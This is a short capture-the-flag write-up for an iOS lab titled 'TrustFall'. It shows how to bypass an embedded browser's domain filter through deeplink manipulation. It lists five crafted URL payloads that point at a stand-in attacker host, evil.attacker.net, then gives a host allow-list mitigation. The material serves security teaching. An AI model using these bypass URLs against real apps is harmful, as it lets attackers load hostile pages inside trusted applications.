# Challenge 05 — TrustFall

> **Course:** [iOS Application Exploitation Challenges](https://academy.8ksec.io/course/ios-application-exploitation-challenges)
> **Focus:** Deeplink manipulation · domain filtering bypass

## Goal

A secure-workspace app opens links in an embedded browser with **domain
filtering**. Bypass the filter via deeplink manipulation so the embedded
browser loads your crafted URL.

## Solution

1. Find the deeplink scheme (Info.plist → `CFBundleURLTypes`) and the
   in-app browser route, e.g.:

```
workspace://open?url=https://allowed-domain.com
```

2. Read the filter logic (class dump / Hopper): it typically validates that
   the URL's host **ends with** or **contains** the allowed domain.
3. Bypass patterns to try, in order:

```
scheme://open?url=https://allowed-domain.com@evil.attacker.net
scheme://open?url=https://evil.attacker.net?url=https://allowed-domain.com
scheme://open?url=https://allowed-domain.com.evil.attacker.net
scheme://open?url=https://allowed-domain.com/..%2f..%2fhttps://evil.attacker.net
scheme://open?url=https://allowed-domain.com%2f..%2f..%2f?x=https://evil.attacker.net
```

4. When the crafted URL loads inside the embedded browser, deliver your
   payload/flag page — lab solved.

## Mitigation

Parse the URL properly, extract the **host**, and compare against an exact
allow-list — never substring-match the full URL.
